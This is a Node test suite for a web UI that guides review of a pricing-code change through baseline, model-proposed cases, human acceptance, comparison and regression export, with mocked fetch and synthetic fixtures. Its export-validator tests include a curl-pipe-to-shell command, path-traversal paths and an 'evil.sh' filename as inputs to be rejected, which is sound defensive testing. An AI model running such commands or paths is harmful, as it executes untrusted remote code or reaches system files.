/*
 * Node tests for the "Break This PR" web UI module (web/app.js).
 *
 * Every fixture in this file is SYNTHETIC test data invented for these
 * tests. Nothing here is an actual Muse/Meta request, model response, or
 * recorded execution result, and no network access happens: the fetch
 * implementation is injected and fully mocked. No fixture encodes the
 * prepared sample's known defect or any reference repair.
 *
 * NOT_RUN: these tests are authored but have not been executed yet.
 */

import test from "node:test";
import assert from "node:assert/strict";

import {
  API_PATHS,
  NO_CASES_MESSAGE,
  createApiClient,
  createStore,
  initialState,
  formatPence,
  describeChargeDifference,
  formatTokenUsage,
  isValidExpectedTotal,
  parsePoundsInput,
  penceToPoundsString,
  validateAccepted,
  validateBaseline,
  validateComparison,
  validateExport,
  validateProposal,
  validateRegression,
  validateSession,
} from "../web/app.js";

const HEX_A = "a1".repeat(32);
const HEX_B = "b2".repeat(32);
const HEX_C = "c3".repeat(32);
const HEX_D = "d4".repeat(32);
const HEX_E = "e5".repeat(32);

function changeEntry() {
  return {
    id: "a",
    title: "Simplify checkout totals into a single pass",
    rule: {
      id: "rule-a",
      title: "Synthetic pricing rule",
      text: "Synthetic rule text used only by these tests.",
      domain: "1-4 lines; integer amounts 100..100000 pence in multiples of 100; explicit boolean eligibility.",
    },
    diff: "--- a/original.ts\n+++ b/candidate.ts\n@@ synthetic test diff @@",
    originalSha256: HEX_A,
    candidateSha256: HEX_B,
  };
}

function baselineCoverage() {
  return {
    label: "Existing checkout assertions",
    cases: [
      {
        id: "cov-1",
        title: "One eligible item",
        lines: [{ amount: 1000, discountEligible: true }],
        expectedTotal: 900,
      },
      {
        id: "cov-2",
        title: "One ineligible item",
        lines: [{ amount: 2000, discountEligible: false }],
        expectedTotal: 2000,
      },
      {
        id: "cov-3",
        title: "Mixed basket",
        lines: [
          { amount: 2000, discountEligible: true },
          { amount: 1000, discountEligible: false },
        ],
        expectedTotal: 2800,
      },
    ],
  };
}

function sessionBody(overrides = {}) {
  return {
    mode: "FIXTURE",
    csrfToken: "demo-token-1",
    callsUsed: 0,
    limit: 6,
    deadline: "2026-10-27T03:50:52Z",
    changes: [changeEntry()],
    baselineCoverage: baselineCoverage(),
    ...overrides,
  };
}

function executionRecord(overrides = {}) {
  return {
    exitCode: 0,
    counts: { tests: 6, passed: 6, failed: 0, skipped: 0, cancelled: 0 },
    stdout: "synthetic runner stdout",
    stderr: "",
    ...overrides,
  };
}

function baselineBody(overrides = {}) {
  return {
    kind: "baseline",
    origin: "LOCAL_EXECUTION",
    changeId: "a",
    status: "PASS",
    coverage: baselineCoverage(),
    execution: executionRecord(),
    sourceIdentities: { original: HEX_A, candidate: HEX_B, baseline: HEX_C },
    limits: ["Synthetic fixture: six baseline assertions only."],
    ...overrides,
  };
}

function regressionBody(overrides = {}) {
  return {
    kind: "regression",
    origin: "LOCAL_EXECUTION",
    runId: "run-1",
    status: "RED_THEN_GREEN",
    testSha256: HEX_C,
    sameTest: true,
    red: executionRecord({
      exitCode: 1,
      counts: { tests: 2, passed: 1, failed: 1, skipped: 0, cancelled: 0 },
    }),
    green: executionRecord({
      exitCode: 0,
      counts: { tests: 2, passed: 2, failed: 0, skipped: 0, cancelled: 0 },
    }),
    correction: {
      kind: "PRE_REVIEWED_FIXED",
      label: "Synthetic pre-reviewed prepared correction",
      faultySha256: HEX_D,
      correctedSha256: HEX_E,
    },
    cleanup: { ownedCopiesRemoved: true },
    limits: ["Synthetic fixture: red/green run over the accepted cases only."],
    ...overrides,
  };
}

function proposalBody(overrides = {}) {
  return {
    kind: "proposal",
    origin: "FIXTURE",
    proposalId: "prop-1",
    model: "synthetic-test-model",
    callsUsed: 1,
    cases: [
      {
        id: "case-1",
        lines: [{ amount: 1000, discountEligible: true }],
        expectedTotal: 900,
        rationale: "Synthetic: one eligible line.",
      },
      {
        id: "case-2",
        lines: [
          { amount: 1000, discountEligible: true },
          { amount: 2000, discountEligible: false },
        ],
        expectedTotal: 2900,
        rationale: "Synthetic: mixed eligibility.",
      },
    ],
    usage: { inputTokens: 10, outputTokens: 20 },
    ...overrides,
  };
}

function acceptedBody(overrides = {}) {
  return {
    kind: "accepted",
    origin: "FIXTURE",
    acceptedId: "acc-1",
    proposalId: "prop-1",
    acceptedCases: [
      {
        caseId: "case-1",
        lines: [{ amount: 1000, discountEligible: true }],
        expectedTotal: 900,
        expectationOrigin: "META_ACCEPTED",
      },
      {
        caseId: "case-2",
        lines: [
          { amount: 1000, discountEligible: true },
          { amount: 2000, discountEligible: false },
        ],
        expectedTotal: 2900,
        expectationOrigin: "META_ACCEPTED",
      },
    ],
    ...overrides,
  };
}

function comparisonBody(overrides = {}) {
  return {
    kind: "comparison",
    origin: "FIXTURE",
    runId: "run-1",
    acceptedId: "acc-1",
    status: "INCONCLUSIVE",
    rows: [
      {
        caseId: "case-1",
        expectedTotal: 900,
        original: { value: 900, error: null },
        candidate: { value: 900, error: null },
      },
      {
        caseId: "case-2",
        expectedTotal: 2900,
        original: { value: 2900, error: null },
        candidate: { value: null, error: "synthetic evaluation error" },
      },
    ],
    sourceIdentities: { original: HEX_A, candidate: HEX_B },
    limits: ["Synthetic fixture: covers only the listed cases."],
    ...overrides,
  };
}

function exportBody(overrides = {}) {
  return {
    kind: "export",
    origin: "FIXTURE",
    filename: "regression.test.mjs",
    path: "evidence/regression.test.mjs",
    testSource: "// INERT_TEST_SOURCE synthetic regression test body\n",
    sha256: HEX_C,
    command: "ota run verify:export --agent",
    ...overrides,
  };
}

function respond(status, body) {
  return {
    ok: status >= 200 && status < 300,
    status,
    json: async () => body,
  };
}

function makeFetch(plan) {
  const calls = [];
  const fetchImpl = (url, options) => {
    calls.push({ url, options: options ?? null });
    const step = plan.shift();
    if (!step) throw new Error("unexpected fetch call in test plan");
    return Promise.resolve().then(() => step(url, options));
  };
  return { fetchImpl, calls };
}

function makeIds() {
  let counter = 0;
  return () => `req-${counter += 1}`;
}

function makeApp(plan) {
  const { fetchImpl, calls } = makeFetch(plan);
  const store = createStore({
    client: createApiClient({ fetchImpl, randomId: makeIds() }),
  });
  return { store, calls };
}

const tick = () => new Promise((resolve) => setTimeout(resolve, 0));

test("no hidden request on creation; session mode stays literal; RECORDED and outages are visible", async () => {
  const { store, calls } = makeApp([() => respond(200, sessionBody({ mode: "LIVE" }))]);
  assert.equal(calls.length, 0, "creating the store must not fetch anything");
  assert.deepEqual(store.getState(), { ...initialState() });

  assert.deepEqual(await store.loadSession(), { ok: true });
  assert.equal(calls.length, 1);
  assert.equal(calls[0].url, API_PATHS.session);
  assert.equal(calls[0].options, null, "session load is a plain GET");
  assert.equal(store.getState().session.mode, "LIVE");

  const recorded = makeApp([() => respond(200, sessionBody({ mode: "RECORDED" }))]);
  const rejected = await recorded.store.loadSession();
  assert.equal(rejected.ok, false);
  assert.equal(recorded.store.getState().session, null, "RECORDED must never be promoted to a session");
  assert.match(recorded.store.getState().errors.session, /LIVE or FIXTURE/);

  const down = makeApp([() => { throw new Error("connection refused"); }]);
  const failed = await down.store.loadSession();
  assert.equal(failed.ok, false);
  assert.equal(down.store.getState().session, null);
  assert.match(down.store.getState().errors.session, /network_unreachable/);
  assert.match(down.store.getState().errors.session, /connection refused/);
});

test("Muse is only asked after an actual baseline PASS; FAIL and inconsistent PASS stay blocking", async () => {
  const { store, calls } = makeApp([
    () => respond(200, sessionBody()),
    () => respond(200, baselineBody({
      status: "FAIL",
      execution: executionRecord({
        exitCode: 1,
        counts: { tests: 6, passed: 5, failed: 1, skipped: 0, cancelled: 0 },
      }),
    })),
    () => respond(200, baselineBody()),
    () => respond(200, proposalBody()),
  ]);
  await store.loadSession();

  assert.deepEqual(await store.propose(), { ok: false, reason: "baseline_required" });
  assert.equal(calls.length, 1, "no model request before any baseline run");

  assert.deepEqual(await store.runBaseline(), { ok: true });
  assert.equal(store.getState().baseline.status, "FAIL");
  assert.deepEqual(await store.propose(), { ok: false, reason: "baseline_required" });
  assert.equal(calls.length, 2, "a failed baseline still blocks the model request");

  assert.deepEqual(await store.runBaseline(), { ok: true }, "a failed baseline may be re-run");
  assert.equal(store.getState().baseline.status, "PASS");
  assert.deepEqual(await store.propose(), { ok: true });
  assert.equal(calls.length, 4);
  assert.deepEqual(await store.runBaseline(), { ok: false, reason: "already_proposed" },
    "the baseline cannot be silently replaced once a proposal exists");

  const inconsistent = makeApp([
    () => respond(200, sessionBody()),
    () => respond(200, baselineBody({
      execution: executionRecord({
        counts: { tests: 6, passed: 5, failed: 1, skipped: 0, cancelled: 0 },
      }),
    })),
  ]);
  await inconsistent.store.loadSession();
  const result = await inconsistent.store.runBaseline();
  assert.equal(result.ok, false);
  assert.equal(inconsistent.store.getState().baseline, null,
    "a PASS claim inconsistent with its execution record is rejected, not shown green");
  assert.match(inconsistent.store.getState().errors.baseline, /inconsistent/);
});

test("compare is blocked before acceptance, export before a REPRODUCED comparison, with no fetch", async () => {
  const { store, calls } = makeApp([
    () => respond(200, sessionBody()),
    () => respond(200, baselineBody()),
    () => respond(200, proposalBody()),
  ]);
  await store.loadSession();
  await store.runBaseline();

  assert.deepEqual(await store.compare(), { ok: false, reason: "not_accepted" });
  assert.deepEqual(await store.exportTest(), { ok: false, reason: "no_comparison" });
  assert.deepEqual(await store.runRegression(), { ok: false, reason: "not_exported" });
  assert.deepEqual(await store.accept(), { ok: false, reason: "no_proposal" });
  assert.equal(calls.length, 2, "guards must refuse without touching the network");

  assert.deepEqual(await store.propose(), { ok: true });
  assert.equal(calls.length, 3);
  assert.deepEqual(await store.compare(), { ok: false, reason: "not_accepted" });
  assert.deepEqual(await store.exportTest(), { ok: false, reason: "no_comparison" });
  assert.equal(calls.length, 3);
});

test("acceptance requires an explicit review confirmation and strictly parsed pound expectations", async () => {
  const { store, calls } = makeApp([
    () => respond(200, sessionBody()),
    () => respond(200, baselineBody()),
    () => respond(200, proposalBody()),
    () => respond(200, acceptedBody()),
  ]);
  await store.loadSession();
  await store.runBaseline();
  await store.propose();

  assert.equal(store.getState().expectations["case-1"].raw, "9.00",
    "proposed pence totals are shown as editable pounds");

  assert.deepEqual(await store.accept(), { ok: false, reason: "not_reviewed" });

  store.setExpectation("case-1", "not a number");
  store.confirmReview(true);
  assert.deepEqual(await store.accept(), { ok: false, reason: "invalid_expectation" });

  store.setExpectation("case-1", "9.005");
  store.confirmReview(true);
  assert.deepEqual(await store.accept(), { ok: false, reason: "invalid_expectation" });
  assert.equal(calls.length, 3, "blocked acceptance must not reach the backend");

  store.setExpectation("case-1", "9.00");
  assert.equal(store.getState().reviewedConfirmed, false, "editing resets the review confirmation");
  assert.deepEqual(await store.accept(), { ok: false, reason: "not_reviewed" });

  store.confirmReview(true);
  assert.deepEqual(await store.accept(), { ok: true });
  assert.equal(calls.length, 4);
  assert.equal(store.getState().accepted.acceptedId, "acc-1");
});

test("reloading the session resets every downstream result instead of blending runs", async () => {
  const { store, calls } = makeApp([
    () => respond(200, sessionBody()),
    () => respond(200, baselineBody()),
    () => respond(200, proposalBody()),
    () => respond(200, acceptedBody()),
    () => respond(200, sessionBody({ csrfToken: "demo-token-2", callsUsed: 1 })),
  ]);
  await store.loadSession();
  await store.runBaseline();
  await store.propose();
  store.confirmReview(true);
  await store.accept();
  assert.equal(store.getState().accepted.acceptedId, "acc-1");

  assert.deepEqual(await store.loadSession(), { ok: true });
  const state = store.getState();
  assert.equal(state.session.csrfToken, "demo-token-2");
  assert.equal(state.baseline, null, "a reload discards the previous baseline result");
  assert.equal(state.proposal, null);
  assert.deepEqual(state.expectations, {});
  assert.equal(state.reviewedConfirmed, false);
  assert.equal(state.accepted, null);
  assert.equal(state.comparison, null);
  assert.equal(state.exportResult, null);
  assert.equal(state.regression, null);
  assert.equal(calls.length, 5, "a reload performs exactly one GET and nothing else");
  assert.deepEqual(await store.propose(), { ok: false, reason: "baseline_required" },
    "the new session starts before the baseline gate again");
});

test("duplicate in-flight actions are suppressed and the call budget is enforced locally", async () => {
  let release;
  const gate = new Promise((resolve) => { release = resolve; });
  const { store, calls } = makeApp([
    () => respond(200, sessionBody()),
    () => respond(200, baselineBody()),
    async () => { await gate; return respond(200, proposalBody()); },
  ]);
  await store.loadSession();
  await store.runBaseline();

  const first = store.propose();
  await tick();
  assert.deepEqual(await store.propose(), { ok: false, reason: "busy" });
  assert.deepEqual(await store.runBaseline(), { ok: false, reason: "busy" });
  assert.deepEqual(await store.refreshUsage(), { ok: false, reason: "busy" });
  assert.deepEqual(await store.compare(), { ok: false, reason: "not_accepted" });
  assert.equal(calls.length, 3, "the duplicate action must not issue a second request");
  release();
  assert.deepEqual(await first, { ok: true });

  const exhausted = makeApp([
    () => respond(200, sessionBody({ callsUsed: 6 })),
    () => respond(200, baselineBody()),
  ]);
  await exhausted.store.loadSession();
  await exhausted.store.runBaseline();
  assert.deepEqual(await exhausted.store.propose(), { ok: false, reason: "budget" });
  assert.equal(exhausted.calls.length, 2, "an exhausted budget must not reach the backend");
});

test("full journey sends the exact contract bodies, headers and fresh requestIds", async () => {
  const editedAccepted = acceptedBody();
  editedAccepted.acceptedCases[0].expectedTotal = 1000;
  editedAccepted.acceptedCases[0].expectationOrigin = "REVIEWER_CORRECTED";
  const editedComparison = comparisonBody({ status: "REPRODUCED" });
  editedComparison.rows[0].expectedTotal = 1000;
  editedComparison.rows[0].candidate = { value: 900, error: null };
  editedComparison.rows[1].candidate = { value: 2700, error: null };

  const { store, calls } = makeApp([
    () => respond(200, sessionBody()),
    () => respond(200, baselineBody()),
    () => respond(200, proposalBody()),
    () => respond(200, editedAccepted),
    () => respond(200, editedComparison),
    () => respond(200, exportBody()),
    () => respond(200, regressionBody()),
  ]);
  await store.loadSession();
  assert.deepEqual(await store.runBaseline(), { ok: true });
  assert.deepEqual(await store.propose(), { ok: true });
  store.setExpectation("case-1", "10.00");
  store.confirmReview(true);
  assert.deepEqual(await store.accept(), { ok: true });
  assert.deepEqual(await store.compare(), { ok: true });
  assert.deepEqual(await store.exportTest(), { ok: true });
  assert.deepEqual(await store.runRegression(), { ok: true });

  const posts = calls.slice(1);
  assert.deepEqual(posts.map((call) => call.url), [
    API_PATHS.baseline,
    API_PATHS.propose,
    API_PATHS.accept,
    API_PATHS.compare,
    API_PATHS.export,
    API_PATHS.regression,
  ]);
  const requestIds = [];
  for (const call of posts) {
    assert.equal(call.options.method, "POST");
    assert.equal(call.options.headers["Content-Type"], "application/json");
    assert.equal(call.options.headers["X-Demo-Token"], "demo-token-1");
    requestIds.push(JSON.parse(call.options.body).requestId);
  }
  assert.deepEqual(requestIds, ["req-1", "req-2", "req-3", "req-4", "req-5", "req-6"]);
  assert.equal(new Set(requestIds).size, 6, "every request carries a fresh unique requestId");

  assert.deepEqual(JSON.parse(posts[0].options.body), { changeId: "a", requestId: "req-1" });
  assert.deepEqual(JSON.parse(posts[1].options.body), { changeId: "a", requestId: "req-2" });
  assert.deepEqual(JSON.parse(posts[2].options.body), {
    proposalId: "prop-1",
    expectations: [
      { caseId: "case-1", expectedTotal: 1000 },
      { caseId: "case-2", expectedTotal: 2900 },
    ],
    reviewed: true,
    requestId: "req-3",
  });
  assert.deepEqual(JSON.parse(posts[3].options.body), { acceptedId: "acc-1", requestId: "req-4" });
  assert.deepEqual(JSON.parse(posts[4].options.body), { runId: "run-1", requestId: "req-5" });
  assert.deepEqual(JSON.parse(posts[5].options.body), { runId: "run-1", requestId: "req-6" });

  const state = store.getState();
  assert.equal(state.baseline.status, "PASS");
  assert.equal(state.expectations["case-1"].edited, true);
  assert.equal(state.accepted.acceptedCases[0].expectationOrigin, "REVIEWER_CORRECTED");
  assert.equal(state.accepted.acceptedCases[1].expectationOrigin, "META_ACCEPTED");
  assert.equal(state.session.callsUsed, 1, "the reported call count is preserved");
  assert.equal(state.comparison.status, "REPRODUCED");
  assert.equal(state.comparison.rows.length, 2, "every comparison row is preserved");
  assert.deepEqual(state.comparison.limits, ["Synthetic fixture: covers only the listed cases."]);
  assert.equal(state.exportResult.testSource.includes("INERT_TEST_SOURCE"), true);
  assert.equal(state.regression.status, "RED_THEN_GREEN");
  assert.equal(state.regression.testSha256, state.exportResult.sha256,
    "the regression ran the same exported test identity");
  assert.equal(state.regression.correction.kind, "PRE_REVIEWED_FIXED");
});

test("an edited expectation echoed back as META_ACCEPTED is rejected, not relabelled", async () => {
  const mislabelled = acceptedBody();
  mislabelled.acceptedCases[0].expectedTotal = 1000;
  // expectationOrigin deliberately stays META_ACCEPTED for the edited case.

  const { store } = makeApp([
    () => respond(200, sessionBody()),
    () => respond(200, baselineBody()),
    () => respond(200, proposalBody()),
    () => respond(200, mislabelled),
  ]);
  await store.loadSession();
  await store.runBaseline();
  await store.propose();
  store.setExpectation("case-1", "10.00");
  store.confirmReview(true);

  const result = await store.accept();
  assert.equal(result.ok, false);
  assert.equal(store.getState().accepted, null, "a mislabelled acceptance must not be stored");
  assert.match(store.getState().errors.accept, /origin/);
});

async function appAtAccepted(extraPlan) {
  const app = makeApp([
    () => respond(200, sessionBody()),
    () => respond(200, baselineBody()),
    () => respond(200, proposalBody()),
    () => respond(200, acceptedBody()),
    ...extraPlan,
  ]);
  await app.store.loadSession();
  await app.store.runBaseline();
  await app.store.propose();
  app.store.confirmReview(true);
  await app.store.accept();
  return app;
}

test("HTTP, network and invalid-shape failures stay visible with no retry and no synthesized success", async () => {
  const { store, calls } = makeApp([
    () => respond(200, sessionBody()),
    () => respond(200, baselineBody()),
    () => respond(500, { error: { code: "provider_busy", message: "try later" } }),
  ]);
  await store.loadSession();
  await store.runBaseline();
  const failed = await store.propose();
  assert.equal(failed.ok, false);
  assert.equal(store.getState().proposal, null, "an error must never become a successful proposal");
  assert.match(store.getState().errors.propose, /provider_busy/);
  assert.equal(calls.length, 3, "failed requests are not retried automatically");
  assert.equal(store.getState().budgetKnown, false);
  assert.deepEqual(await store.propose(), { ok: false, reason: "usage_unknown" });

  const badShape = await appAtAccepted([
    () => respond(200, comparisonBody({ status: "GREAT" })),
  ]);
  const compared = await badShape.store.compare();
  assert.equal(compared.ok, false);
  assert.equal(badShape.store.getState().comparison, null);
  assert.match(badShape.store.getState().errors.compare, /status/);

  const netDown = await appAtAccepted([
    () => { throw new Error("socket hang up"); },
  ]);
  const unreachable = await netDown.store.compare();
  assert.equal(unreachable.ok, false);
  assert.equal(netDown.store.getState().comparison, null);
  assert.match(netDown.store.getState().errors.compare, /network_unreachable/);
});

test("failed consumed proposal requires explicit read-only budget refresh before another model dispatch", async () => {
  const { store, calls } = makeApp([
    () => respond(200, sessionBody()),
    () => respond(200, baselineBody()),
    () => respond(502, { error: { code: "PROVIDER_FAILED_CONSUMED", message: "reservation consumed" } }),
    () => respond(503, { error: { code: "BUDGET_LOCKED", message: "uncertain persistence" } }),
    () => respond(200, sessionBody({ callsUsed: 1 })),
    () => respond(200, proposalBody({ callsUsed: 2 })),
  ]);
  await store.loadSession();
  await store.runBaseline();
  assert.equal((await store.propose()).ok, false);
  assert.equal(store.getState().budgetKnown, false);
  assert.deepEqual(await store.propose(), { ok: false, reason: "usage_unknown" });
  assert.equal((await store.refreshUsage()).ok, false);
  assert.equal(store.getState().budgetKnown, false);
  assert.deepEqual(await store.propose(), { ok: false, reason: "usage_unknown" });
  assert.equal((await store.refreshUsage()).ok, true);
  assert.equal(store.getState().session.callsUsed, 1);
  assert.equal(store.getState().baseline.status, "PASS", "the executed baseline result is retained");
  assert.equal(calls.filter((call) => call.url === API_PATHS.propose).length, 1);
  assert.equal((await store.propose()).ok, true);
  assert.equal(store.getState().session.callsUsed, 2);
  assert.equal(calls.filter((call) => call.url === API_PATHS.propose).length, 2);
});

test("a claimed RED_THEN_GREEN without matching evidence is rejected, never shown as green proof", async () => {
  const atExported = async (regressionPlan) => {
    const app = await appAtAccepted([
      () => respond(200, comparisonBody({ status: "REPRODUCED" })),
      () => respond(200, exportBody()),
      ...regressionPlan,
    ]);
    await app.store.compare();
    await app.store.exportTest();
    return app;
  };

  const broken = [
    regressionBody({ testSha256: HEX_D }),
    regressionBody({
      red: executionRecord({
        exitCode: 0,
        counts: { tests: 2, passed: 2, failed: 0, skipped: 0, cancelled: 0 },
      }),
    }),
    regressionBody({
      red: executionRecord({
        exitCode: 1,
        counts: { tests: 2, passed: 0, failed: 1, skipped: 1, cancelled: 0 },
      }),
    }),
    regressionBody({
      red: executionRecord({
        exitCode: 1,
        counts: { tests: 5, passed: 4, failed: 1, skipped: 0, cancelled: 0 },
      }),
    }),
    regressionBody({
      green: executionRecord({
        exitCode: 0,
        counts: { tests: 2, passed: 1, failed: 0, skipped: 1, cancelled: 0 },
      }),
    }),
    regressionBody({ cleanup: { ownedCopiesRemoved: false } }),
  ];
  for (const body of broken) {
    const app = await atExported([() => respond(200, body)]);
    const result = await app.store.runRegression();
    assert.equal(result.ok, false, "unproven RED_THEN_GREEN evidence must be refused");
    assert.equal(app.store.getState().regression, null);
    assert.match(app.store.getState().errors.regression, /not proven/);
  }

  const claimedWithoutSameTest = await atExported([
    () => respond(200, regressionBody({ sameTest: false })),
  ]);
  const refusedShape = await claimedWithoutSameTest.store.runRegression();
  assert.equal(refusedShape.ok, false,
    "RED_THEN_GREEN without sameTest is refused as an invalid shape");
  assert.equal(claimedWithoutSameTest.store.getState().regression, null);
  assert.match(claimedWithoutSameTest.store.getState().errors.regression, /sameTest/);

  const inconclusive = await atExported([
    () => respond(200, regressionBody({ status: "INCONCLUSIVE", green: null, sameTest: true })),
  ]);
  assert.deepEqual(await inconclusive.store.runRegression(), { ok: true });
  assert.equal(inconclusive.store.getState().regression.status, "INCONCLUSIVE",
    "an inconclusive run is stored honestly, not upgraded or hidden");
  assert.deepEqual(await inconclusive.store.runRegression(), { ok: false, reason: "already_run" });

  const wrongRun = await atExported([
    () => respond(200, regressionBody({ runId: "run-other" })),
  ]);
  const echoed = await wrongRun.store.runRegression();
  assert.equal(echoed.ok, false, "a regression for a different runId is refused");
  assert.equal(wrongRun.store.getState().regression, null);
});

test("budget refresh refuses a different nonce or regressed count rather than adopting or resetting it", async () => {
  for (const next of [{ csrfToken: "changed-nonce" }, { callsUsed: 0 }]) {
    const { store, calls } = makeApp([
      () => respond(200, sessionBody({ callsUsed: 1 })),
      () => respond(200, baselineBody()),
      () => respond(200, sessionBody({ callsUsed: 1, ...next })),
    ]);
    await store.loadSession();
    await store.runBaseline();
    assert.equal((await store.refreshUsage()).ok, false);
    assert.equal(store.getState().budgetKnown, false);
    assert.equal(store.getState().session.callsUsed, 1);
    assert.deepEqual(await store.propose(), { ok: false, reason: "usage_unknown" });
    assert.equal(calls.filter((call) => call.url === API_PATHS.propose).length, 0);
  }
});

test("acceptance freezes permanently: edits and review toggles cannot unlock, before or after comparison", async () => {
  const app = await appAtAccepted([() => respond(200, comparisonBody())]);
  assert.deepEqual(app.store.setExpectation("case-1", "10.00"), { ok: false, reason: "frozen" },
    "a successful acceptance freezes expectations even before any comparison");
  assert.deepEqual(app.store.confirmReview(false), { ok: false, reason: "frozen" });

  await app.store.compare();
  const before = JSON.stringify(app.store.getState());
  assert.deepEqual(app.store.setExpectation("case-1", "10.00"), { ok: false, reason: "frozen" });
  assert.deepEqual(app.store.confirmReview(false), { ok: false, reason: "frozen" });
  assert.deepEqual(await app.store.accept(), { ok: false, reason: "already_accepted" });
  assert.equal(JSON.stringify(app.store.getState()), before);
  assert.equal(app.calls.length, 5, "no new acceptance/runner request follows a blocked edit");
});

test("nullable token usage accepts a charged proposal and displays UNKNOWN rather than zero", async () => {
  const { store } = makeApp([
    () => respond(200, sessionBody()),
    () => respond(200, baselineBody()),
    () => respond(200, proposalBody({ usage: { inputTokens: null, outputTokens: null } })),
  ]);
  await store.loadSession();
  await store.runBaseline();
  assert.deepEqual(await store.propose(), { ok: true });
  assert.equal(store.getState().session.callsUsed, 1);
  assert.equal(store.getState().budgetKnown, true);
  assert.deepEqual(store.getState().proposal.usage, { inputTokens: null, outputTokens: null });
  assert.equal(formatTokenUsage(null), "UNKNOWN");
  assert.equal(formatTokenUsage(0), "0");
  assert.equal(validateProposal(proposalBody({ usage: { inputTokens: -1, outputTokens: null } })).ok, false);
  assert.equal(validateProposal(proposalBody({ usage: { inputTokens: "0", outputTokens: null } })).ok, false);
});

test("valid empty proposal is visibly inconclusive, never comparison approval or an automatic retry", async () => {
  const { store, calls } = makeApp([
    () => respond(200, sessionBody()),
    () => respond(200, baselineBody()),
    () => respond(422, { error: { code: "NO_CASES_PROPOSED", message: "No cases" } }),
    () => respond(200, sessionBody({ callsUsed: 1 })),
  ]);
  await store.loadSession();
  await store.runBaseline();
  assert.equal((await store.propose()).ok, false);
  assert.equal(store.getState().errors.propose, NO_CASES_MESSAGE,
    "the exact inconclusive wording is shown, not a paraphrase");
  assert.equal(store.getState().proposal, null);
  assert.equal(store.getState().comparison, null);
  assert.equal(store.getState().budgetKnown, false);
  assert.deepEqual(await store.compare(), { ok: false, reason: "not_accepted" });
  assert.deepEqual(await store.exportTest(), { ok: false, reason: "no_comparison" });
  assert.deepEqual(await store.propose(), { ok: false, reason: "usage_unknown" });
  assert.equal(calls.length, 3);
  await store.refreshUsage();
  assert.equal(store.getState().session.callsUsed, 1);
  assert.equal(calls[3].url, API_PATHS.session);
});

test("baseline, proposal and comparison origins must stay literal; RECORDED data is never promoted", async () => {
  const { store } = makeApp([
    () => respond(200, sessionBody()),
    () => respond(200, baselineBody({ origin: "FIXTURE" })),
  ]);
  await store.loadSession();
  const baselineResult = await store.runBaseline();
  assert.equal(baselineResult.ok, false,
    "a baseline that is not an actual local execution is refused");
  assert.equal(store.getState().baseline, null);
  assert.match(store.getState().errors.baseline, /LOCAL_EXECUTION/);

  const recordedProposal = makeApp([
    () => respond(200, sessionBody()),
    () => respond(200, baselineBody()),
    () => respond(200, proposalBody({ origin: "RECORDED" })),
  ]);
  await recordedProposal.store.loadSession();
  await recordedProposal.store.runBaseline();
  const result = await recordedProposal.store.propose();
  assert.equal(result.ok, false);
  assert.equal(recordedProposal.store.getState().proposal, null);
  assert.match(recordedProposal.store.getState().errors.propose, /LIVE or FIXTURE/);

  const recordedComparison = await appAtAccepted([
    () => respond(200, comparisonBody({ origin: "RECORDED" })),
  ]);
  const compared = await recordedComparison.store.compare();
  assert.equal(compared.ok, false);
  assert.equal(recordedComparison.store.getState().comparison, null);
  assert.match(recordedComparison.store.getState().errors.compare, /LIVE or FIXTURE/);
});

test("export requires a REPRODUCED comparison; the exported test is held as inert, server-persisted data", async () => {
  const notReproduced = await appAtAccepted([() => respond(200, comparisonBody())]);
  await notReproduced.store.compare();
  assert.deepEqual(await notReproduced.store.exportTest(), { ok: false, reason: "not_reproduced" },
    "an inconclusive comparison never unlocks the regression export");
  assert.equal(notReproduced.calls.length, 5, "the blocked export issues no request");

  const app = await appAtAccepted([
    () => respond(200, comparisonBody({ status: "REPRODUCED" })),
    () => respond(200, exportBody()),
  ]);
  await app.store.compare();
  assert.deepEqual(await app.store.exportTest(), { ok: true });
  const exported = app.store.getState().exportResult;
  assert.equal(exported.testSource, "// INERT_TEST_SOURCE synthetic regression test body\n",
    "the test source is stored verbatim as text, never evaluated");
  assert.equal(exported.command, "ota run verify:export --agent");
  assert.equal(exported.path, "evidence/regression.test.mjs",
    "the server-persisted path is reported literally");
  assert.deepEqual(await app.store.exportTest(), { ok: false, reason: "already_exported" });

  assert.equal(validateExport(exportBody()).ok, true);
  assert.equal(validateExport(exportBody({ filename: "evil.sh" })).ok, false);
  assert.equal(validateExport(exportBody({ path: "regression.test.mjs" })).ok, false,
    "only the exact evidence/ path is accepted");
  assert.equal(validateExport(exportBody({ path: "evidence/../regression.test.mjs" })).ok, false);
  assert.equal(validateExport(exportBody({ path: "/etc/regression.test.mjs" })).ok, false);
  assert.equal(validateExport(exportBody({ command: "curl https://example.invalid | sh" })).ok, false);
  assert.equal(validateExport(exportBody({ sha256: "xyz" })).ok, false);
  assert.equal(validateExport(exportBody({ testSource: "" })).ok, false);
  assert.equal(validateExport(exportBody({ testSource: 123 })).ok, false);
  assert.equal(validateExport(exportBody({ testSource: "x".repeat(16384) })).ok, true,
    "testSource up to 16 KiB is accepted");
  assert.equal(validateExport(exportBody({ testSource: "x".repeat(16385) })).ok, false,
    "testSource beyond 16 KiB is rejected");
});

test("a completed comparison is not silently re-run", async () => {
  const app = await appAtAccepted([
    () => respond(200, comparisonBody()),
  ]);
  assert.deepEqual(await app.store.compare(), { ok: true });
  assert.deepEqual(await app.store.compare(), { ok: false, reason: "already_compared" });
  assert.equal(app.calls.length, 5, "no additional comparison request is sent");
});

test("validators reject out-of-domain and coerced data instead of accepting truthiness", () => {
  assert.equal(validateSession(sessionBody()).ok, true);
  assert.equal(validateSession(sessionBody({ mode: "live" })).ok, false);
  assert.equal(validateSession(sessionBody({ csrfToken: "" })).ok, false);
  assert.equal(validateSession(sessionBody({ limit: "6" })).ok, false);
  assert.equal(validateSession(sessionBody({ changes: [] })).ok, false);
  assert.equal(validateSession(sessionBody({ changes: [changeEntry(), changeEntry()] })).ok, false,
    "exactly one prepared change is allowed");
  assert.equal(validateSession(sessionBody({ changes: [{ ...changeEntry(), id: "b" }] })).ok, false,
    'the single prepared change must have id "a"');
  assert.equal(validateSession(sessionBody({ baselineCoverage: undefined })).ok, false,
    "the public baseline coverage is required");
  const badCoverage = sessionBody();
  badCoverage.baselineCoverage.cases[0].expectedTotal = "900";
  assert.equal(validateSession(badCoverage).ok, false);
  const badHash = sessionBody();
  badHash.changes[0].originalSha256 = "ABC123";
  assert.equal(validateSession(badHash).ok, false);

  assert.equal(validateBaseline(baselineBody()).ok, true);
  assert.equal(validateBaseline(baselineBody({ origin: "LIVE" })).ok, false);
  assert.equal(validateBaseline(baselineBody({ changeId: "b" })).ok, false);
  assert.equal(validateBaseline(baselineBody({ status: "GREEN" })).ok, false);
